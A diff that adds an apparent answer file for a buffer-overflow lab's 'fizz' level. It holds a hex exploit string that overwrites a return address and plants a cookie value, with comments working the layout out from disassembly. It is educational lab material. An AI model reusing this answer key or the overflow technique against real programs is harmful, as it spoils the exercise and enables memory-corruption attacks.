@@ -1,0 +1,27 @@
+/* Answer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 42 8c 04 08
+00 00 00 00 55 fb cf 17
+
+/* Explain
+ * Like lv0, we call fizz function throught %esp,
+ * disassemble fizz function, found:
+ *     mov 0x8(%ebp), %eax
+ *     0x804d108, %eax
+ * means: 0x8(%ebp) -> cookie(fizz function)
+ *        0x804d108 -> valI(fizz function)
+ * that we should put our cookies below the buffer+0x8
+ * so the final answer is:
+ *
+ *     00 00 00 00 00 00 00 00
+ *     00 00 00 00 00 00 00 00
+ *     00 00 00 00 00 00 00 00
+ *     00 00 00 00 00 00 00 00
+ *     00 00 00 00 00 00 00 00
+ *     00 00 00 00 42 8c 04 08
+ *     00 00 00 00 55 fb cf 17
+ */
